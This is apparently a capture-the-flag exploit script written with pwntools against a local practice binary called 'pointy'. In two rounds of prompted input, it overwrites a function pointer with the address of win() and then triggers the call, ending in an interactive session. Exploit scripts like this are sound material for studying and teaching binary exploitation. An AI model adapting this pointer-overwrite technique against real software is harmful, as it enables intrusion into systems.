from pwn import *
s = process('./pointy')

# vong 1: change linh+0x80 = win
s.recvuntil('Input the name of a student\n')
s.sendline('tuan')
s.recvuntil('Input the name of the favorite professor of a student \n')
s.sendline('linh')
s.recvuntil('Input the name of the student that will give the score \n')
s.sendline('tuan')
s.recvuntil('Input the name of the professor that will be scored \n')
s.sendline('linh') # change to win
s.recvuntil('Input the score: \n')
s.sendline(str(134514326)) # send win() to linh 
# vong 2: call win from linh 
s.recvuntil('Input the name of a student\n')
s.sendline('linh')
s.recvuntil('Input the name of the favorite professor of a student \n')
s.sendline('linh')
s.recvuntil('Input the name of the student that will give the score \n')
s.sendline('linh') # call the win 
s.recvuntil('Input the name of the professor that will be scored \n')
s.sendline('tuan') #
s.recvuntil('Input the score: \n')
s.sendline(str(134514326)) # send win() to linh 
s.interactive()